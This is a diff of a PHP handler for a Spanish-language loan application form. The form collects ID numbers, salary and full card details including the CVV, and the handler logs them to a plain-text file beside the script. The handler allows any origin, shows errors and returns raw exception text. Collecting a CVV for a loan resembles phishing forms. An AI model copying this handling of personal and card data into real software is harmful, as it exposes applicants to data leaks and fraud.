@@ -6,7 +6,7 @@ ini_set('display_errors', 1);
 // Set headers
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, OPTIONS");
-header("Access-Control-Allow-Headers: Content-Type");
+header("Access-Control-Allow-Headers: Content-Type, Accept");
 header("Content-Type: application/json");
 
 // Handle preflight OPTIONS request
@@ -19,7 +19,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 // Check if this is a POST request
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
-    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
+    echo json_encode(['success' => false, 'error' => 'Método no permitido']);
     exit();
 }
 
@@ -31,41 +31,60 @@ function sanitize_input($data) {
     return $data;
 }
 
-// Get and sanitize form data
-$formData = [
-    'loanAmount' => sanitize_input($_POST['loanAmount'] ?? ''),
-    'loanTerm' => sanitize_input($_POST['loanTerm'] ?? ''),
-    'firstName' => sanitize_input($_POST['firstName'] ?? ''),
-    'lastName' => sanitize_input($_POST['lastName'] ?? ''),
-    'dni' => sanitize_input($_POST['dni'] ?? ''),
-    'province' => sanitize_input($_POST['province'] ?? ''),
-    'email' => sanitize_input($_POST['email'] ?? ''),
-    'phone' => sanitize_input($_POST['phone'] ?? ''),
-    'occupation' => sanitize_input($_POST['occupation'] ?? ''),
-    'company' => sanitize_input($_POST['company'] ?? ''),
-    'position' => sanitize_input($_POST['position'] ?? ''),
-    'monthlySalary' => sanitize_input($_POST['monthlySalary'] ?? ''),
-    'yearsEmployed' => sanitize_input($_POST['yearsEmployed'] ?? ''),
-    'cardType' => sanitize_input($_POST['cardType'] ?? ''),
-    'cardNumber' => sanitize_input($_POST['cardNumber'] ?? ''),
-    'cardName' => sanitize_input($_POST['cardName'] ?? ''),
-    'cardExpiry' => sanitize_input($_POST['cardExpiry'] ?? ''),
-    'cardCvv' => sanitize_input($_POST['cardCvv'] ?? ''),
-    'timestamp' => date('Y-m-d H:i:s')
-];
-
-// Validate required fields
-$requiredFields = ['firstName', 'lastName', 'dni', 'cardNumber', 'cardName', 'cardExpiry', 'cardCvv'];
-foreach ($requiredFields as $field) {
-    if (empty($formData[$field])) {
-        http_response_code(400);
-        echo json_encode(['success' => false, 'error' => "El campo {$field} es requerido"]);
-        exit();
-    }
-}
-
 try {
-    // Create log entry with proper formatting
+    // Get raw POST data if sent as JSON
+    $rawData = file_get_contents("php://input");
+    $postData = $_POST ?: json_decode($rawData, true) ?: [];
+
+    // Get and sanitize form data
+    $formData = [
+        'loanAmount' => sanitize_input($postData['loanAmount'] ?? ''),
+        'loanTerm' => sanitize_input($postData['loanTerm'] ?? ''),
+        'firstName' => sanitize_input($postData['firstName'] ?? ''),
+        'lastName' => sanitize_input($postData['lastName'] ?? ''),
+        'dni' => sanitize_input($postData['dni'] ?? ''),
+        'province' => sanitize_input($postData['province'] ?? ''),
+        'email' => sanitize_input($postData['email'] ?? ''),
+        'phone' => sanitize_input($postData['phone'] ?? ''),
+        'occupation' => sanitize_input($postData['occupation'] ?? ''),
+        'company' => sanitize_input($postData['company'] ?? ''),
+        'position' => sanitize_input($postData['position'] ?? ''),
+        'monthlySalary' => sanitize_input($postData['monthlySalary'] ?? ''),
+        'yearsEmployed' => sanitize_input($postData['yearsEmployed'] ?? ''),
+        'cardType' => sanitize_input($postData['cardType'] ?? ''),
+        'cardNumber' => sanitize_input($postData['cardNumber'] ?? ''),
+        'cardName' => sanitize_input($postData['cardName'] ?? ''),
+        'cardExpiry' => sanitize_input($postData['cardExpiry'] ?? ''),
+        'cardCvv' => sanitize_input($postData['cardCvv'] ?? ''),
+        'timestamp' => date('Y-m-d H:i:s')
+    ];
+
+    // Validate required fields
+    $requiredFields = ['firstName', 'lastName', 'dni', 'cardNumber', 'cardName', 'cardExpiry', 'cardCvv'];
+    $missingFields = [];
+    
+    foreach ($requiredFields as $field) {
+        if (empty($formData[$field])) {
+            $missingFields[] = $field;
+        }
+    }
+    
+    if (!empty($missingFields)) {
+        throw new Exception('Campos requeridos faltantes: ' . implode(', ', $missingFields));
+    }
+
+    // Create the storage directory if it doesn't exist
+    $storageDir = __DIR__ . '/storage';
+    if (!file_exists($storageDir)) {
+        if (!mkdir($storageDir, 0755, true)) {
+            throw new Exception('No se pudo crear el directorio de almacenamiento');
+        }
+    }
+
+    // Set the file path
+    $filePath = $storageDir . '/solicitudes_prestamos.txt';
+
+    // Create log entry
     $logEntry = "\n=== NUEVA SOLICITUD: {$formData['timestamp']} ===\n";
     $logEntry .= "DATOS DEL PRÉSTAMO\n";
     $logEntry .= "Monto: $" . number_format((float)$formData['loanAmount'], 2, ',', '.') . "\n";
@@ -87,31 +106,19 @@ try {
 
     $logEntry .= "DATOS DE TARJETA\n";
     $logEntry .= "Tipo: {$formData['cardType']}\n";
-    $logEntry .= "Número: " . substr($formData['cardNumber'], -4) . "\n"; // Only last 4 digits for security
+    $logEntry .= "Número: ****" . substr($formData['cardNumber'], -4) . "\n";
     $logEntry .= "Titular: {$formData['cardName']}\n";
     $logEntry .= "Vencimiento: {$formData['cardExpiry']}\n";
-    $logEntry .= "CVV: ***\n\n"; // Hide CVV for security
+    $logEntry .= "CVV: ***\n\n";
     $logEntry .= "======================================\n\n";
 
-    // Set the file path relative to the script
-    $filePath = __DIR__ . '/solicitudes_prestamos.txt';
-    
-    // Ensure the directory exists and is writable
-    $directory = dirname($filePath);
-    if (!is_dir($directory)) {
-        mkdir($directory, 0755, true);
-    }
-
-    // Check if file exists, if not create it
-    if (!file_exists($filePath)) {
-        touch($filePath);
-        chmod($filePath, 0644);
-    }
-
-    // Append the log entry to the file
+    // Write to file with exclusive lock
     if (file_put_contents($filePath, $logEntry, FILE_APPEND | LOCK_EX) === false) {
-        throw new Exception('No se pudo guardar la información en el archivo');
+        throw new Exception('Error al guardar los datos');
     }
+
+    // Set proper permissions
+    chmod($filePath, 0644);
 
     // Return success response
     echo json_encode([
@@ -120,10 +127,10 @@ try {
     ]);
 
 } catch (Exception $e) {
-    error_log("Error saving form data: " . $e->getMessage());
+    error_log("Error en el procesamiento del formulario: " . $e->getMessage());
     http_response_code(500);
     echo json_encode([
         'success' => false,
-        'error' => 'Error al procesar la solicitud: ' . $e->getMessage()
+        'error' => $e->getMessage()
     ]);
 }
